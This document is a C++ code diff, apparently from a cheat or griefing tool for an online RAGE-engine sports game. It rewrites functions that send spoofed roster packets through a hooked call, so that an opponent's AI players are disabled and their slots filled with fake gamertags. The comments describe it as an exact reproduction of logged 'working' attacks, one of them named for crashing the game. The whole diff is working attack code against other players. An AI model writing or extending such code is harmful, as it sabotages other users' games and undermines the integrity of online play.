@@ -659,49 +659,56 @@ bool ai_control::SendDisableOpponentAi()
     //      it replaced opponent's real name with ZH_BOT. Skipping keeps
     //      their captain visible while 9 non-captain slots still fill
     //      with ghost bots.
+    // Reproducing disable_vs_ai_2.log attack byte-for-byte:
+    //   - 11 packets, slots 0..0x0A (captain included, no skip)
+    //   - buf[0] = oppSide (0x00 in the captured log = HOME target)
+    //   - buf[1] = slot, buf[2] = 0xFF, buf[3] = slot mirror
+    //   - Fixed 9-char gamertag "ZH_GHOST_" on ALL 11 packets
+    //     (working log used "PROLLYZAA" — not per-slot differentiated)
+    //   - spoof_call 6th arg = 0x01 (log shows Slot=0x01), NOT 0xFF
     hook::g_allow_attack_send = true;
-    for (uint8_t slot = 1; slot < 0x0A; ++slot) {
+    for (uint8_t slot = 0; slot < 0x0B; ++slot) {
         __stosb(reinterpret_cast<unsigned char*>(buf), 0, 0x38);
 
-        buf[0] = oppSide;          // team — LOG-CONFIRMED selects HOME(0)/AWAY(1)
-        buf[1] = slot;             // per-team slot 1..9 (skip captain at 0)
+        buf[0] = oppSide;
+        buf[1] = slot;
         buf[2] = 0xFF;
-        buf[3] = slot;             // mirror
+        buf[3] = slot;
 
-        static const unsigned char kPrefix[] = { 'Z','H','_','B','O','T','_' };
-        for (int i = 0; i < 7; ++i) buf[24 + i] = kPrefix[i];
-        buf[24 + 7] = static_cast<uint8_t>('0' + slot);
+        // Fixed gamertag (9 chars) at offset 24 — identical on all packets.
+        static const unsigned char kTag[9] = { 'Z','H','_','G','H','O','S','T','_' };
+        for (int i = 0; i < 9; ++i) buf[24 + i] = kTag[i];
 
         __try {
             spoof_call(fn, (uint64_t)rcx,
                        (uint64_t*)&opcode, (uint64_t*)&opcode,
-                       (void*)buf, (int)0x38, (char)0xFF, (unsigned char)0);
+                       (void*)buf, (int)0x38,
+                       (char)0x01,          // 6th arg = 0x01 (matches working log Slot=0x01)
+                       (unsigned char)0);
             ++sent;
         } __except (EXCEPTION_EXECUTE_HANDLER) { ++threw; }
     }
     hook::g_allow_attack_send = false;
 
     log::debugf(
-        "[AI] RosterSpoof: 0xFAE6B64D playerside=%d mySide=%u oppSide=%u (slots 1..9 per-team, captain skipped) sent=%d threw=%d\r\n",
+        "[AI] RosterSpoof: 0xFAE6B64D playerside=%d mySide=%u oppSide=%u (11 pkts 0..0xA, tag=ZH_GHOST_, slot-arg=0x01) sent=%d threw=%d\r\n",
         sliders::playerside, mySide, oppSide, sent, threw);
 
-    if (sent == 9 && threw == 0) {
+    if (sent == 11 && threw == 0) {
         g_rosterSpoofFired = true;
-        toast::Show(toast::Type::Success, "Roster spoof fired (9 pkts, captain kept)");
+        toast::Show(toast::Type::Success, "Roster spoof fired (11 pkts, exact-reproduction)");
         return true;
     }
     toast::Show(toast::Type::Error, "Roster spoof partial/failed");
     return false;
 }
 
-// Shared helper — spoof targeting a specific team. User verified live
-// that buf[0] (team field) is IGNORED by the peer's UI subscriber —
-// destination team is picked from the SLOT INDEX range:
-//   slot ∈ 0..10  → HOME team
-//   slot ∈ 11..21 → AWAY team
-// So to target AWAY we must use slot base = 11 (skip captain at 11,
-// iterate 12..20 = 9 packets).
-static int RosterSpoof_Team(uint8_t teamIdx, uint8_t slotBase, const char* tagBase)
+// Reproducing the logged attacks byte-for-byte. Two variants based on
+// target side seen in captured logs:
+//   disable_vs_ai_2.log:      buf[0]=0x00, slot-arg=0x01 (target HOME)
+//   disable_ai_and_crash.log: buf[0]=0x01, slot-arg=0x00 (target AWAY)
+// Same 11-packet burst, same fixed 9-char gamertag, slots 0..0x0A.
+static int RosterSpoof_Exact(uint8_t teamIdx, char slotArg, const char* tag9)
 {
     uintptr_t rcx = 0;
     rage::dispatch_fn_t fn = nullptr;
@@ -714,46 +721,43 @@ static int RosterSpoof_Team(uint8_t teamIdx, uint8_t slotBase, const char* tagBa
     int sent = 0, threw = 0;
 
     hook::g_allow_attack_send = true;
-    for (uint8_t k = 1; k < 0x0A; ++k) {
-        const uint8_t slot = slotBase + k;  // HOME: 1..9, AWAY: 12..20
+    for (uint8_t slot = 0; slot < 0x0B; ++slot) {
         __stosb(reinterpret_cast<unsigned char*>(buf), 0, 0x38);
         buf[0] = teamIdx;
         buf[1] = slot;
         buf[2] = 0xFF;
         buf[3] = slot;
 
-        // 7-char prefix + 1-char slot-within-team suffix (1..9)
-        for (int i = 0; i < 7; ++i) buf[24 + i] = (unsigned char)tagBase[i];
-        buf[24 + 7] = static_cast<uint8_t>('0' + k);
+        for (int i = 0; i < 9; ++i) buf[24 + i] = (unsigned char)tag9[i];
 
         __try {
             spoof_call(fn, (uint64_t)rcx,
                        (uint64_t*)&opcode, (uint64_t*)&opcode,
-                       (void*)buf, (int)0x38, (char)0xFF, (unsigned char)0);
+                       (void*)buf, (int)0x38, slotArg, (unsigned char)0);
             ++sent;
         } __except (EXCEPTION_EXECUTE_HANDLER) { ++threw; }
     }
     hook::g_allow_attack_send = false;
 
-    log::debugf("[AI] RosterSpoof_Team: buf[0]=%u slotBase=%u (slots %u..%u) sent=%d threw=%d tag=%s\r\n",
-                teamIdx, slotBase, slotBase + 1, slotBase + 9, sent, threw, tagBase);
+    log::debugf("[AI] RosterSpoof_Exact: buf[0]=%u slotArg=0x%02X tag=%s sent=%d threw=%d\r\n",
+                teamIdx, (unsigned)(uint8_t)slotArg, tag9, sent, threw);
     return (threw == 0) ? sent : 0;
 }
 
 bool ai_control::SendDisableOppAi_ForceHome()
 {
-    // HOME team = slots 0..10 → iterate 1..9 (skip captain at slot 0).
-    int n = RosterSpoof_Team(0, 0, "ZH_HOM_");
-    if (n == 9) { toast::Show(toast::Type::Success, "Spoof HOME team (slots 1..9) fired"); return true; }
+    // Exact reproduction of disable_vs_ai_2.log working attack.
+    int n = RosterSpoof_Exact(0x00, (char)0x01, "ZH_HOM_AA");
+    if (n == 11) { toast::Show(toast::Type::Success, "Spoof HOME exact (buf[0]=0, slot-arg=0x01)"); return true; }
     toast::Show(toast::Type::Error, "Spoof HOME failed");
     return false;
 }
 
 bool ai_control::SendDisableOppAi_ForceAway()
 {
-    // AWAY team = slots 11..21 → iterate 12..20 (skip captain at slot 11).
-    int n = RosterSpoof_Team(1, 11, "ZH_AWY_");
-    if (n == 9) { toast::Show(toast::Type::Success, "Spoof AWAY team (slots 12..20) fired"); return true; }
+    // Exact reproduction of disable_ai_and_crash.log AWAY-target attack.
+    int n = RosterSpoof_Exact(0x01, (char)0x00, "ZH_AWY_AA");
+    if (n == 11) { toast::Show(toast::Type::Success, "Spoof AWAY exact (buf[0]=1, slot-arg=0x00)"); return true; }
     toast::Show(toast::Type::Error, "Spoof AWAY failed");
     return false;
 }
